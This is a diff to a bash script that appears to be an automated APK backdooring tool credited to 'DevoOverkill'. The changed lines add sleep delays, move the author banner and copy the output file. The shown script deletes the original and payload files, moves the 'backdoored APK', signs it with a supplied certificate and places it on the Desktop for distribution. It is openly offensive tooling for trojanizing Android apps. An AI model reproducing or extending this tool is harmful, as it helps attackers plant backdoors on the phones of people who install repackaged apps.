@@ -37,9 +37,10 @@ echo -e """
 ██╔══██║██║   ██║   ██║   ██║   ██║    ██╔══╝  ██║╚██╔╝██║██╔══██╗██╔══╝  ██║  ██║╚██╗  ██╔╝
 ██║  ██║╚██████╔╝   ██║   ╚██████╔╝    ███████╗██║ ╚═╝ ██║██████╔╝███████╗██████╔╝ ╚██╗██╔╝ 
 ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝     ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═════╝   ╚═╝╚═╝  
-$red>>$Cafe Coded & Developed By :$blue David$Cafe[$red DevoOverkill $Cafe]  
 """
+sleep 1.0
 
+echo -e "$red>>$Cafe Coded & Developed By :$blue David$Cafe[$red DevoOverkill $Cafe]"
 read -p "Enter APK name without format># "  apk #no format please >> !=APK
 echo
 
@@ -61,19 +62,27 @@ echo
 echo -e "$Cafe[$red+$Cafe]$blue Deleting unused files"
 $(rm -r original payload original.apk payload.apk)
 echo
+sleep 2.0
 
 echo -e "$Cafe[$red+$Cafe]$blue Moving backdoored APK.."
 echo $(mv $apk+backdoored.apk SignApk)
+sleep 1.5
 
 echo -e "$Cafe[$red+$Cafe]$blue Signing APK.."
-echo $(java -jar SignApk/$signapk SignApk/$certificate SignApk/$key SignApk/$apk+backdoored.apk SignApk/$apk.apk)
+$(java -jar SignApk/$signapk SignApk/$certificate SignApk/$key SignApk/$apk+backdoored.apk SignApk/$apk.apk)
 echo $(rm SignApk/$apk+backdoored.apk)
 
 echo -e "$Cafe[$red+$Cafe]$blue Moving the APK to Desktop"
-echo $(mv SignApk/$apk.apk /root/Desktop)
+echo $(cp SignApk/$apk.apk /root/Desktop)
+sleep 1.5
+
+echo -e "$Cafe[$red*$Cafe]$blue The backdoored App will be in SignApk Folder or in Desktop!"
+echo
+sleep 2.0
 
 echo -e "$Cafe[$red+$Cafe]$blue The process has been done successfully!"
 echo -e "$Cafe[$red!$Cafe]$blue Exiting..."
+sleep 1.0
 
 echo -e """ $purple
 
